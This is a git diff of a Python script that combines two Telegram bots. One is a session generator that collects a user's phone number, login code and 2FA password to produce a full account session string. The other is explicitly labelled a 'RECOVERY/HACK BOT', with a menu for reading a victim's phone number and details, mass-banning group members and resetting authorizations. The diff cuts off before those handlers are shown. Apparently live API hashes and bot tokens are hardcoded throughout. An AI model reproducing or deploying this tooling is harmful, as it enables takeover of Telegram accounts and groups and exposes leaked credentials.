@@ -8,78 +8,37 @@ from threading import Thread
 
 from flask import Flask
 
-from pyrogram import Client, filters, idle
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
+from pyrogram import Client, filters, idle, enums
+from pyrogram.raw import functions
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, ChatPrivileges
 from pyrogram.errors import (
-    ApiIdInvalid, 
-    PhoneNumberInvalid, 
-    PhoneCodeInvalid, 
-    PhoneCodeExpired, 
-    SessionPasswordNeeded, 
-    PasswordHashInvalid,
-    ApiIdPublishedFlood,
-    AccessTokenInvalid,
-    FloodWait,
-    InputUserDeactivated,
-    UserIsBlocked,
-    PeerIdInvalid
+    ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, 
+    SessionPasswordNeeded, PasswordHashInvalid, ApiIdPublishedFlood,
+    AccessTokenInvalid, FloodWait, InputUserDeactivated, UserIsBlocked, PeerIdInvalid
 )
 from pyromod import listen
 from asyncio.exceptions import TimeoutError
 
-from telethon import TelegramClient
+from telethon import TelegramClient, functions as tfunc
 from telethon.sessions import StringSession
+from telethon.tl.functions.channels import (
+    GetAdminedPublicChannelsRequest, JoinChannelRequest, LeaveChannelRequest,
+    DeleteChannelRequest, EditBannedRequest
+)
+from telethon.tl.types import ChannelParticipantsAdmins, ChatBannedRights
+from telethon.tl.functions.auth import ResetAuthorizationsRequest
 from telethon.errors import (
-    ApiIdInvalidError,
-    PhoneNumberInvalidError,
-    PhoneCodeInvalidError,
-    PhoneCodeExpiredError,
-    SessionPasswordNeededError,
-    PasswordHashInvalidError
+    ApiIdInvalidError, PhoneNumberInvalidError, PhoneCodeInvalidError,
+    PhoneCodeExpiredError, SessionPasswordNeededError, PasswordHashInvalidError
 )
 
-# ==================== CONFIG ====================
-API_ID = int(getenv("API_ID", "10796618"))
-API_HASH = getenv("API_HASH", "4e4b20b4e1e40c90fcb1a7658c800150")
-BOT_TOKEN = getenv("BOT_TOKEN", "8351290809:AAGNTwNVF9i39PmgI-tGp_SpEbaYBjxiveA")
-OWNER_ID = int(getenv("OWNER_ID", "5368154755"))
-MUST_JOIN = getenv("MUST_JOIN", "RomeoBot_op")
-
-# ==================== DATABASE ====================
-DB_FILE = "users_db.json"
-
-def load_db():
-    if os.path.exists(DB_FILE):
-        with open(DB_FILE, 'r') as f:
-            return json.load(f)
-    return {"users": []}
-
-def save_db(data):
-    with open(DB_FILE, 'w') as f:
-        json.dump(data, f, indent=4)
-
-async def is_served_user(user_id: int) -> bool:
-    db = load_db()
-    return user_id in db["users"]
-
-async def get_served_users() -> list:
-    db = load_db()
-    return db["users"]
-
-async def add_served_user(user_id: int):
-    if await is_served_user(user_id):
-        return
-    db = load_db()
-    db["users"].append(user_id)
-    save_db(db)
-
-# ==================== FLASK ====================
+# ==================== FLASK SERVER (SHARED) ====================
 logging.getLogger("werkzeug").setLevel(logging.ERROR)
 flask_app = Flask(__name__)
 
 @flask_app.route("/")
 def home():
-    return "✅ Session Generator Bot is running!"
+    return "✅ Both Bots are running!"
 
 @flask_app.route("/healthz")
 def healthz():
@@ -91,56 +50,94 @@ def run_flask():
 
 Thread(target=run_flask, daemon=True).start()
 
-# ==================== BOT SETUP ====================
+# ==================== LOGGING ====================
 logging.basicConfig(level=logging.WARNING, format="%(asctime)s - %(levelname)s - %(message)s")
 
-app = Client(
+# ╔═══════════════════════════════════════════════════════════════╗
+# ║           BOT 1: SESSION GENERATOR BOT                        ║
+# ╚═══════════════════════════════════════════════════════════════╝
+
+# ==================== CONFIG - BOT 1 ====================
+API_ID_1 = int(getenv("API_ID_1", "10796618"))
+API_HASH_1 = getenv("API_HASH_1", "4e4b20b4e1e40c90fcb1a7658c800150")
+BOT_TOKEN_1 = getenv("BOT_TOKEN_1", "8351290809:AAGNTwNVF9i39PmgI-tGp_SpEbaYBjxiveA")
+OWNER_ID_1 = int(getenv("OWNER_ID_1", "5368154755"))
+MUST_JOIN_1 = getenv("MUST_JOIN_1", "RomeoBot_op")
+
+# ==================== DATABASE - BOT 1 ====================
+DB_FILE_1 = "users_db_session_gen.json"
+
+def load_db_1():
+    if os.path.exists(DB_FILE_1):
+        with open(DB_FILE_1, 'r') as f:
+            return json.load(f)
+    return {"users": []}
+
+def save_db_1(data):
+    with open(DB_FILE_1, 'w') as f:
+        json.dump(data, f, indent=4)
+
+async def is_served_user_1(user_id: int) -> bool:
+    db = load_db_1()
+    return user_id in db["users"]
+
+async def get_served_users_1() -> list:
+    db = load_db_1()
+    return db["users"]
+
+async def add_served_user_1(user_id: int):
+    if await is_served_user_1(user_id):
+        return
+    db = load_db_1()
+    db["users"].append(user_id)
+    save_db_1(db)
+
+# ==================== CLIENT - BOT 1 ====================
+session_gen_bot = Client(
     "SessionGenBot",
-    api_id=API_ID,
-    api_hash=API_HASH,
-    bot_token=BOT_TOKEN,
+    api_id=API_ID_1,
+    api_hash=API_HASH_1,
+    bot_token=BOT_TOKEN_1,
     in_memory=True
 )
 
-# ==================== BUTTONS ====================
-ask_ques = "**Please choose the python library you want to generate string session for:**"
+# ==================== BUTTONS - BOT 1 ====================
+ask_ques_1 = "**Please choose the python library you want to generate string session for:**"
 
-buttons_ques = InlineKeyboardMarkup([
-    [InlineKeyboardButton("🔷 Pyrogram V2 🔷", callback_data="pyrogram")],
-    [InlineKeyboardButton("🔷 Pyrogram (Old) 🔷", callback_data="pyrogram1")],
-    [InlineKeyboardButton("🔷 Telethon 🔷", callback_data="telethon")],
-    [InlineKeyboardButton("🔶 Pyrogram V2 Bot 🔶", callback_data="pyrogram_bot"),
-     InlineKeyboardButton("🔶 Telethon Bot 🔶", callback_data="telethon_bot")]
+buttons_ques_1 = InlineKeyboardMarkup([
+    [InlineKeyboardButton("🔷 Pyrogram V2 🔷", callback_data="gen_pyrogram")],
+    [InlineKeyboardButton("🔷 Pyrogram (Old) 🔷", callback_data="gen_pyrogram1")],
+    [InlineKeyboardButton("🔷 Telethon 🔷", callback_data="gen_telethon")],
+    [InlineKeyboardButton("🔶 Pyrogram V2 Bot 🔶", callback_data="gen_pyrogram_bot"),
+     InlineKeyboardButton("🔶 Telethon Bot 🔶", callback_data="gen_telethon_bot")]
 ])
 
-gen_button = InlineKeyboardMarkup([
-    [InlineKeyboardButton("🔄 Start Generating Session", callback_data="generate")]
+gen_button_1 = InlineKeyboardMarkup([
+    [InlineKeyboardButton("🔄 Start Generating Session", callback_data="gen_generate")]
 ])
 
-# ==================== USER DATABASE ====================
-@app.on_message(filters.private & ~filters.service, group=1)
-async def users_sql(_, msg: Message):
-    await add_served_user(msg.from_user.id)
+# ==================== HANDLERS - BOT 1 ====================
+@session_gen_bot.on_message(filters.private & ~filters.service, group=1)
+async def users_sql_1(_, msg: Message):
+    await add_served_user_1(msg.from_user.id)
 
-# ==================== START COMMAND ====================
-@app.on_message(filters.private & filters.command("start"))
-async def start(bot: Client, msg: Message):
+@session_gen_bot.on_message(filters.private & filters.command("start"))
+async def start_1(bot: Client, msg: Message):
     me = await bot.get_me()
     
-    # Must Join button
-    if MUST_JOIN:
-        if MUST_JOIN.startswith("@"):
-            link = f"https://t.me/{MUST_JOIN[1:]}"
+    if MUST_JOIN_1:
+        if MUST_JOIN_1.startswith("@"):
+            link = f"https://t.me/{MUST_JOIN_1[1:]}"
         else:
-            link = f"https://t.me/{MUST_JOIN}"
+            link = f"https://t.me/{MUST_JOIN_1}"
         
         buttons = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔷 Start Generating 🔷", callback_data="generate")],
+            [InlineKeyboardButton("🔷 Start Generating 🔷", callback_data="gen_generate")],
             [InlineKeyboardButton("📢 Join Channel", url=link)]
         ])
     else:
         buttons = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔷 Start Generating 🔷", callback_data="generate")]
+            [InlineKeyboardButton("🔷 Start Generating 🔷", callback_data="gen_generate")]
         ])
     
     await msg.reply_text(
@@ -155,35 +152,31 @@ async def start(bot: Client, msg: Message):
         reply_markup=buttons
     )
 
-# ==================== GENERATE COMMAND ====================
-@app.on_message(filters.private & filters.command(["generate", "gen", "string", "str"]))
-async def generate_command(bot: Client, msg: Message):
-    await msg.reply(ask_ques, reply_markup=buttons_ques)
+@session_gen_bot.on_message(filters.private & filters.command(["generate", "gen", "string", "str"]))
+async def generate_command_1(bot: Client, msg: Message):
+    await msg.reply(ask_ques_1, reply_markup=buttons_ques_1)
 
-# ==================== STATS COMMAND ====================
-@app.on_message(filters.user(OWNER_ID) & filters.command("stats"))
-async def stats(bot: Client, msg: Message):
-    users = await get_served_users()
+@session_gen_bot.on_message(filters.user(OWNER_ID_1) & filters.command("stats"))
+async def stats_1(bot: Client, msg: Message):
+    users = await get_served_users_1()
     await msg.reply_text(
         f"📊 **Bot Statistics:**\n\n"
         f"👥 Total Users: **{len(users)}**",
         quote=True
     )
 
-# ==================== BROADCAST COMMAND ====================
-@app.on_message(filters.user(OWNER_ID) & filters.command("broadcast"))
-async def broadcast_command(bot: Client, msg: Message):
+@session_gen_bot.on_message(filters.user(OWNER_ID_1) & filters.command("broadcast"))
+async def broadcast_command_1(bot: Client, msg: Message):
     if msg.reply_to_message:
         broadcast_msg = msg.reply_to_message
     else:
         await msg.reply_text(
             "❌ **Please reply to a message to broadcast!**\n\n"
-            "**Usage:**\n"
-            "Reply to any message with `/broadcast`"
+            "**Usage:**\nReply to any message with `/broadcast`"
         )
         return
     
-    users = await get_served_users()
+    users = await get_served_users_1()
     total_users = len(users)
     
     if total_users == 0:
@@ -224,7 +217,7 @@ async def broadcast_command(bot: Client, msg: Message):
             try:
                 await broadcast_msg.copy(user_id)
                 success += 1
-            except Exception:
+            except:
                 failed += 1
                 
         except InputUserDeactivated:
@@ -240,7 +233,6 @@ async def broadcast_command(bot: Client, msg: Message):
             
         except Exception as e:
             failed += 1
-            print(f"Error broadcasting to {user_id}: {e}")
     
     await status_msg.edit_text(
         f"📡 **Broadcast Completed!**\n\n"
@@ -252,8 +244,8 @@ async def broadcast_command(bot: Client, msg: Message):
         f"**Success Rate:** `{round((success/total_users)*100, 2)}%`"
     )
 
-# ==================== SESSION GENERATOR ====================
-async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=False, is_bot=False):
+# ==================== SESSION GENERATOR FUNCTION - BOT 1 ====================
+async def generate_session_1(bot: Client, msg: Message, telethon=False, old_pyro=False, is_bot=False):
     if telethon:
         ty = "Telethon"
     else:
@@ -266,7 +258,6 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=F
     await msg.reply(f"🚀 **Starting {ty} Session Generation...**")
     user_id = msg.chat.id
     
-    # Ask for API_ID
     api_id_msg = await bot.ask(
         user_id, 
         "📝 **Send your API_ID**\n\n"
@@ -274,44 +265,39 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=F
         "❌ Click /cancel to cancel",
         filters=filters.text
     )
-    if await cancelled(api_id_msg):
+    if await cancelled_1(api_id_msg):
         return
     
     if api_id_msg.text == "/skip":
-        api_id = API_ID
-        api_hash = API_HASH
+        api_id = API_ID_1
+        api_hash = API_HASH_1
     else:
         try:
             api_id = int(api_id_msg.text)
         except ValueError:
             await api_id_msg.reply(
-                "❌ **Invalid API_ID!** Must be an integer.\n\n"
-                "Please start again.",
+                "❌ **Invalid API_ID!** Must be an integer.\n\nPlease start again.",
                 quote=True,
-                reply_markup=gen_button
+                reply_markup=gen_button_1
             )
             return
         
-        # Ask for API_HASH
         api_hash_msg = await bot.ask(
             user_id,
             "📝 **Now send your API_HASH**\n\n❌ Click /cancel to cancel",
             filters=filters.text
         )
-        if await cancelled(api_hash_msg):
+        if await cancelled_1(api_hash_msg):
             return
         api_hash = api_hash_msg.text.strip()
     
-    # Ask for Phone/Bot Token
     if not is_bot:
-        t = "📱 **Send your PHONE NUMBER** with country code\n\n" \
-            "Example: `+919876543210`\n\n❌ Click /cancel to cancel"
+        t = "📱 **Send your PHONE NUMBER** with country code\n\nExample: `+919876543210`\n\n❌ Click /cancel to cancel"
     else:
-        t = "🤖 **Send your BOT TOKEN**\n\n" \
-            "Example: `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`\n\n❌ Click /cancel to cancel"
+        t = "🤖 **Send your BOT TOKEN**\n\nExample: `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`\n\n❌ Click /cancel to cancel"
     
     phone_number_msg = await bot.ask(user_id, t, filters=filters.text)
-    if await cancelled(phone_number_msg):
+    if await cancelled_1(phone_number_msg):
         return
     phone_number = phone_number_msg.text.strip()
     
@@ -320,7 +306,6 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=F
     else:
         await msg.reply("🔐 **Logging as Bot...**")
     
-    # Create Client
     if telethon and is_bot:
         client = TelegramClient(StringSession(), api_id, api_hash)
     elif telethon:
@@ -334,7 +319,6 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=F
     
     await client.connect()
     
-    # Send Code
     try:
         code = None
         if not is_bot:
@@ -343,21 +327,14 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=F
             else:
                 code = await client.send_code(phone_number)
     except (ApiIdInvalid, ApiIdInvalidError):
-        await msg.reply(
-            "❌ **Invalid API_ID/API_HASH combination!**\n\nPlease start again.",
-            reply_markup=gen_button
-        )
+        await msg.reply("❌ **Invalid API_ID/API_HASH combination!**\n\nPlease start again.", reply_markup=gen_button_1)
         await client.disconnect()
         return
     except (PhoneNumberInvalid, PhoneNumberInvalidError):
-        await msg.reply(
-            "❌ **Invalid Phone Number!**\n\nPlease start again.",
-            reply_markup=gen_button
-        )
+        await msg.reply("❌ **Invalid Phone Number!**\n\nPlease start again.", reply_markup=gen_button_1)
         await client.disconnect()
         return
     
-    # Ask for OTP
     try:
         phone_code_msg = None
         if not is_bot:
@@ -370,18 +347,14 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=F
                 filters=filters.text,
                 timeout=600
             )
-            if await cancelled(phone_code_msg):
+            if await cancelled_1(phone_code_msg):
                 await client.disconnect()
                 return
     except TimeoutError:
-        await msg.reply(
-            "⏱ **Timeout!** 10 minutes exceeded.\n\nPlease start again.",
-            reply_markup=gen_button
-        )
+        await msg.reply("⏱ **Timeout!** 10 minutes exceeded.\n\nPlease start again.", reply_markup=gen_button_1)
         await client.disconnect()
         return
     
-    # Sign In
     if not is_bot:
         phone_code = phone_code_msg.text.replace(" ", "").strip()
         try:
@@ -390,17 +363,11 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=F
             else:
                 await client.sign_in(phone_number, code.phone_code_hash, phone_code)
         except (PhoneCodeInvalid, PhoneCodeInvalidError):
-            await msg.reply(
-                "❌ **Invalid OTP!**\n\nPlease start again.",
-                reply_markup=gen_button
-            )
+            await msg.reply("❌ **Invalid OTP!**\n\nPlease start again.", reply_markup=gen_button_1)
             await client.disconnect()
             return
         except (PhoneCodeExpired, PhoneCodeExpiredError):
-            await msg.reply(
-                "❌ **OTP Expired!**\n\nPlease start again.",
-                reply_markup=gen_button
-            )
+            await msg.reply("❌ **OTP Expired!**\n\nPlease start again.", reply_markup=gen_button_1)
             await client.disconnect()
             return
         except (SessionPasswordNeeded, SessionPasswordNeededError):
@@ -408,23 +375,19 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=F
                 two_step_msg = await bot.ask(
                     user_id,
                     "🔐 **Your account has 2-Step Verification!**\n\n"
-                    "📝 Send your password (exactly as set, case-sensitive)\n"
+                    "📝 Send your password\n"
                     "⏱ Timeout: 5 minutes\n\n"
-                    "⚠️ **Note:** Copy-paste your password carefully!\n"
                     "❌ Click /cancel to cancel",
                     filters=filters.text,
                     timeout=300
                 )
                 
-                if await cancelled(two_step_msg):
+                if await cancelled_1(two_step_msg):
                     await client.disconnect()
                     return
                     
             except TimeoutError:
-                await msg.reply(
-                    "⏱ **Timeout!** 5 minutes exceeded.\n\nPlease start again.",
-                    reply_markup=gen_button
-                )
+                await msg.reply("⏱ **Timeout!** 5 minutes exceeded.\n\nPlease start again.", reply_markup=gen_button_1)
                 await client.disconnect()
                 return
             
@@ -438,24 +401,9 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=F
                     
             except (PasswordHashInvalid, PasswordHashInvalidError):
                 await two_step_msg.reply(
-                    "❌ **Invalid Password!**\n\n"
-                    "⚠️ **Troubleshooting:**\n"
-                    "• Password is case-sensitive\n"
-                    "• Copy-paste it carefully\n"
-                    "• Check for extra spaces\n"
-                    "• Make sure it's your correct 2FA password\n\n"
-                    "Please start again.",
+                    "❌ **Invalid Password!**\n\nPlease start again.",
                     quote=True,
-                    reply_markup=gen_button
-                )
-                await client.disconnect()
-                return
-            except Exception as e:
-                await two_step_msg.reply(
-                    f"❌ **Error:** `{str(e)}`\n\n"
-                    "Please start again.",
-                    quote=True,
-                    reply_markup=gen_button
+                    reply_markup=gen_button_1
                 )
                 await client.disconnect()
                 return
@@ -466,15 +414,10 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=F
             else:
                 await client.sign_in_bot(phone_number)
         except Exception as e:
-            await msg.reply(
-                f"❌ **Bot login failed!**\n\n"
-                f"Error: `{str(e)}`",
-                reply_markup=gen_button
-            )
+            await msg.reply(f"❌ **Bot login failed!**\n\nError: `{str(e)}`", reply_markup=gen_button_1)
             await client.disconnect()
             return
     
-    # Generate String Session
     string_session = None
     try:
         if telethon:
@@ -482,41 +425,16 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=F
                 await client.connect()
             string_session = client.session.save()
         else:
-            if not is_bot:
-                try:
-                    me = await client.get_me()
-                    print(f"✅ Logged in as: {me.first_name} ({me.id})")
-                except Exception as e:
-                    print(f"⚠️ Get me error: {e}")
-            
             string_session = await client.export_session_string()
         
         if not string_session or len(string_session) < 10:
-            raise Exception("Generated session string is empty or too short!")
-        
-        print(f"✅ Session generated! Length: {len(string_session)}")
+            raise Exception("Generated session string is empty!")
         
     except Exception as e:
-        print(f"❌ Session generation error: {e}")
-        await msg.reply(
-            f"❌ **Failed to generate session!**\n\n"
-            f"Error: `{str(e)}`\n\n"
-            f"Please try again.",
-            reply_markup=gen_button
-        )
+        await msg.reply(f"❌ **Failed to generate session!**\n\nError: `{str(e)}`", reply_markup=gen_button_1)
         await client.disconnect()
         return
     
-    if not string_session:
-        await msg.reply(
-            "❌ **Session generation failed!**\n\n"
-            "Session string is empty. Please try again.",
-            reply_markup=gen_button
-        )
-        await client.disconnect()
-        return
-    
-    # Send session to user
     text = (
         f"✅ **{ty.upper()} STRING SESSION**\n\n"
         f"`{string_session}`\n\n"
@@ -527,34 +445,24 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=F
     try:
         if not is_bot:
             await client.send_message("me", text)
-    except Exception as e:
-        print(f"⚠️ Could not send to saved messages: {e}")
+    except:
+        pass
     
     try:
         await bot.send_message(msg.chat.id, text)
-    except Exception as e:
-        print(f"❌ Error sending session: {e}")
-        try:
-            await bot.send_message(msg.chat.id, f"✅ **{ty.upper()} STRING SESSION**\n\n**Session String:**")
-            await bot.send_message(msg.chat.id, f"`{string_session}`")
-            await bot.send_message(msg.chat.id, f"⚠️ **Keep it safe and don't share!**\n🤖 **Generated by:** @{(await bot.get_me()).username}")
-        except Exception as e2:
-            print(f"❌ Failed to send session: {e2}")
+    except:
+        await bot.send_message(msg.chat.id, f"✅ **{ty.upper()} STRING SESSION**\n\n**Session String:**")
+        await bot.send_message(msg.chat.id, f"`{string_session}`")
     
     await client.disconnect()
-    
-    await bot.send_message(
-        msg.chat.id,
-        f"✅ **Successfully generated {ty} string session!**\n\n"
-        f"📬 Check your **Saved Messages** for a copy!"
-    )
+    await bot.send_message(msg.chat.id, f"✅ **Successfully generated {ty} string session!**")
 
-async def cancelled(msg):
+async def cancelled_1(msg):
     if "/cancel" in msg.text:
-        await msg.reply("❌ **Cancelled!**", quote=True, reply_markup=gen_button)
+        await msg.reply("❌ **Cancelled!**", quote=True, reply_markup=gen_button_1)
         return True
     elif "/restart" in msg.text:
-        await msg.reply("🔄 **Restarted!**", quote=True, reply_markup=gen_button)
+        await msg.reply("🔄 **Restarted!**", quote=True, reply_markup=gen_button_1)
         return True
     elif "/skip" in msg.text:
         return False
@@ -564,113 +472,65 @@ async def cancelled(msg):
     else:
         return False
 
-# ==================== CALLBACKS ====================
-@app.on_callback_query()
-async def handle_callbacks(bot: Client, callback_query: CallbackQuery):
+@session_gen_bot.on_callback_query()
+async def handle_callbacks_1(bot: Client, callback_query: CallbackQuery):
     query = callback_query.data
     
-    if query == "generate":
+    if query == "gen_generate":
         await callback_query.answer()
-        await callback_query.message.reply(ask_ques, reply_markup=buttons_ques)
+        await callback_query.message.reply(ask_ques_1, reply_markup=buttons_ques_1)
     
-    elif query.startswith("pyrogram") or query.startswith("telethon"):
+    elif query.startswith("gen_pyrogram") or query.startswith("gen_telethon"):
         try:
-            if query == "pyrogram":
-                await callback_query.answer("⚠️ Pyrogram V2 sessions only work with updated bots!", show_alert=True)
-                await generate_session(bot, callback_query.message)
+            if query == "gen_pyrogram":
+                await callback_query.answer("⚠️ Pyrogram V2", show_alert=True)
+                await generate_session_1(bot, callback_query.message)
             
-            elif query == "pyrogram1":
-                await callback_query.answer("📱 Pyrogram Old Version", show_alert=True)
-                await generate_session(bot, callback_query.message, old_pyro=True)
+            elif query == "gen_pyrogram1":
+                await callback_query.answer("📱 Pyrogram Old", show_alert=True)
+                await generate_session_1(bot, callback_query.message, old_pyro=True)
             
-            elif query == "pyrogram_bot":
-                await callback_query.answer("🤖 Pyrogram V2 Bot Session", show_alert=True)
-                await generate_session(bot, callback_query.message, is_bot=True)
+            elif query == "gen_pyrogram_bot":
+                await callback_query.answer("🤖 Pyrogram V2 Bot", show_alert=True)
+                await generate_session_1(bot, callback_query.message, is_bot=True)
             
-            elif query == "telethon_bot":
-                await callback_query.answer("🤖 Telethon Bot Session", show_alert=True)
-                await generate_session(bot, callback_query.message, telethon=True, is_bot=True)
+            elif query == "gen_telethon_bot":
+                await callback_query.answer("🤖 Telethon Bot", show_alert=True)
+                await generate_session_1(bot, callback_query.message, telethon=True, is_bot=True)
             
-            elif query == "telethon":
-                await callback_query.answer("📱 Telethon User Session", show_alert=True)
-                await generate_session(bot, callback_query.message, telethon=True)
+            elif query == "gen_telethon":
+                await callback_query.answer("📱 Telethon User", show_alert=True)
+                await generate_session_1(bot, callback_query.message, telethon=True)
         
         except Exception as e:
-            print(f"Callback error: {e}")
             await callback_query.message.reply(f"❌ **An error occurred!**\n\nError: `{str(e)}`")
 
-# ==================== RUN BOT ====================
-if __name__ == "__main__":
-    print("🚀 Starting Session Generator Bot...")
-    print("=" * 50)
-    
-    try:
-        app.start()
-        me = app.get_me()
-        print(f"✅ Bot: @{me.username}")
-        print(f"🔐 Must Join: {MUST_JOIN if MUST_JOIN else 'Not Set'}")
-        print("=" * 50)
-        print("✅ Bot is ready!")
-        print("=" * 50)
-        
-        idle()
-        
-    except (ApiIdInvalid, ApiIdPublishedFlood):
-        raise Exception("❌ Invalid API_ID/API_HASH!")
-    except AccessTokenInvalid:
-        raise Exception("❌ Invalid BOT_TOKEN!")
-    finally:
-        app.stop()
-        print("👋 Bot stopped!")
 
+# ╔═══════════════════════════════════════════════════════════════╗
+# ║           BOT 2: RECOVERY/HACK BOT                            ║
+# ╚═══════════════════════════════════════════════════════════════╝
 
-# recovery bot
+# ==================== CONFIG - BOT 2 ====================
+API_ID_2 = int(getenv("API_ID_2", "10796618"))
+API_HASH_2 = getenv("API_HASH_2", "4e4b20b4e1e40c90fcb1a7658c800150")
+BOT_TOKEN_2 = getenv("BOT_TOKEN_2", "7936981734:AAEh17m4-gE7bq9Ky5H-QP1bkRTlP_YaIGI")
+START_PIC_2 = getenv("START_PIC_2", "https://telegra.ph//file/a9a90059ae47fa840b0b3.jpg")
 
-import os
-import asyncio
-import logging
-from pyrogram import Client, filters, enums, idle
-from pyrogram.raw import functions
-from pyrogram.errors import FloodWait
-from pyrogram.types import InlineKeyboardButton as IKB, InlineKeyboardMarkup as IKM, ChatPrivileges
-from telethon import TelegramClient, functions as tfunc
-from telethon.sessions import StringSession
-from telethon.tl.functions.channels import (
-    GetAdminedPublicChannelsRequest,
-    JoinChannelRequest,
-    LeaveChannelRequest,
-    DeleteChannelRequest,
-    EditBannedRequest
+FORCE_JOIN_CHANNELS_2 = ["@ROMEOBOT_OP", "@ROMEO_OP"]
+OWNER_NAME_2 = "𝕾🅡︎🅐︎🅙︎𝕾"
+OWNER_USERNAME_2 = "@romeo_op"
+
+# ==================== CLIENT - BOT 2 ====================
+recovery_bot = Client(
+    "RecoveryBot",
+    api_id=API_ID_2,
+    api_hash=API_HASH_2,
+    bot_token=BOT_TOKEN_2,
+    in_memory=True
 )
-from telethon.tl.types import ChannelParticipantsAdmins, ChatBannedRights
-from telethon.tl.functions.auth import ResetAuthorizationsRequest
-from pyromod import listen
 
-# ==================== CONFIG ====================
-API_ID = int(os.getenv("API_ID", "10796618"))
-API_HASH = os.getenv("API_HASH", "4e4b20b4e1e40c90fcb1a7658c800150")
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8351290809:AAGNTwNVF9i39PmgI-tGp_SpEbaYBjxiveA")
-START_PIC = os.getenv("START_PIC", "https://telegra.ph//file/a9a90059ae47fa840b0b3.jpg")
-
-# Universal Force Join Channels - Edit karne ke liye sirf yahan change karo
-FORCE_JOIN_CHANNELS = [
-    "@ROMEOBOT_OP",
-    "@ROMEO_OP"
-]
-
-# Owner Info - Customize karo apne hisaab se
-OWNER_NAME = "𝕾🅡︎🅐︎🅙︎𝕾"
-OWNER_USERNAME = "@romeo_op"  # Optional
-
-# ==================== LOGGING ====================
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
-
-# ==================== CLIENT ====================
-app = Client("romeorj", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
-
-# ==================== MESSAGES ====================
-PM_TEXT = """
+# ==================== MESSAGES - BOT 2 ====================
+PM_TEXT_2 = """
 **Hey {},**
 I'm **{}**
 
@@ -680,7 +540,7 @@ I'm **{}**
 ❥︎ Owner: {owner}
 """
 
-HACK_TEXT = """
+HACK_TEXT_2 = """
 **A** ~ Check user own groups and channels (PUBLIC ONLY)
 **B** ~ Check user all information like phone number, username... etc
 **C** ~ Ban all the members from the group
@@ -701,94 +561,73 @@ HACK_TEXT = """
 ❥︎ Owner: {owner}
 """
 
-# ==================== BUTTONS ====================
-PM_BUTTON = IKM([[IKB("● 𝐇𝐀𝐂𝐊 ●", callback_data="hack_btn")]])
+# ==================== BUTTONS - BOT 2 ====================
+PM_BUTTON_2 = InlineKeyboardMarkup([[InlineKeyboardButton("● 𝐇𝐀𝐂𝐊 ●", callback_data="hack_btn_2")]])
 
-HACK_MODS = IKM([
-    [IKB("A", callback_data="A"), IKB("B", callback_data="B"), IKB("C", callback_data="C"),
-     IKB("D", callback_data="D"), IKB("E", callback_data="E")],
-    [IKB("F", callback_data="F"), IKB("G", callback_data="G"), IKB("H", callback_data="H"),
-     IKB("I", callback_data="I"), IKB("J", callback_data="J")],
-    [IKB("K", callback_data="K"), IKB("L", callback_data="L"), IKB("M", callback_data="M"),
-     IKB("N", callback_data="N"), IKB("O", callback_data="O")],
-    [IKB("P", callback_data="P")],
+HACK_MODS_2 = InlineKeyboardMarkup([
+    [InlineKeyboardButton("A", callback_data="hack_A"), InlineKeyboardButton("B", callback_data="hack_B"), 
+     InlineKeyboardButton("C", callback_data="hack_C"), InlineKeyboardButton("D", callback_data="hack_D"), 
+     InlineKeyboardButton("E", callback_data="hack_E")],
+    [InlineKeyboardButton("F", callback_data="hack_F"), InlineKeyboardButton("G", callback_data="hack_G"), 
+     InlineKeyboardButton("H", callback_data="hack_H"), InlineKeyboardButton("I", callback_data="hack_I"), 
+     InlineKeyboardButton("J", callback_data="hack_J")],
+    [InlineKeyboardButton("K", callback_data="hack_K"), InlineKeyboardButton("L", callback_data="hack_L"), 
+     InlineKeyboardButton("M", callback_data="hack_M"), InlineKeyboardButton("N", callback_data="hack_N"), 
+     InlineKeyboardButton("O", callback_data="hack_O")],
+    [InlineKeyboardButton("P", callback_data="hack_P")],
 ])
 
-# ==================== RIGHTS ====================
-BAN_RIGHTS = ChatBannedRights(
-    until_date=None,
-    view_messages=True,
-    send_messages=True,
-    send_media=True,
-    send_stickers=True,
-    send_gifs=True,
-    send_games=True,
-    send_inline=True,
-    embed_links=True,
+# ==================== RIGHTS - BOT 2 ====================
+BAN_RIGHTS_2 = ChatBannedRights(
+    until_date=None, view_messages=True, send_messages=True, send_media=True,
+    send_stickers=True, send_gifs=True, send_games=True, send_inline=True, embed_links=True,
 )
 
-FULL_PROMOTE = ChatPrivileges(
-    can_change_info=True,
-    can_delete_messages=True,
-    can_restrict_members=True,
-    can_pin_messages=True,
-    can_manage_video_chats=True,
-    can_promote_members=True,
-    can_invite_users=True
+FULL_PROMOTE_2 = ChatPrivileges(
+    can_change_info=True, can_delete_messages=True, can_restrict_members=True,
+    can_pin_messages=True, can_manage_video_chats=True, can_promote_members=True, can_invite_users=True
 )
 
-PROMOTE = ChatPrivileges(
-    can_change_info=True,
-    can_delete_messages=True,
-    can_restrict_members=True,
-    can_pin_messages=True
+PROMOTE_2 = ChatPrivileges(
+    can_change_info=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True
 )
 
-DEMOTE = ChatPrivileges(
-    can_change_info=False,
-    can_invite_users=False,
-    can_delete_messages=False,
-    can_restrict_members=False,
-    can_pin_messages=False,
-    can_promote_members=False,
-    can_manage_chat=False,
-    can_manage_video_chats=False,
+DEMOTE_2 = ChatPrivileges(
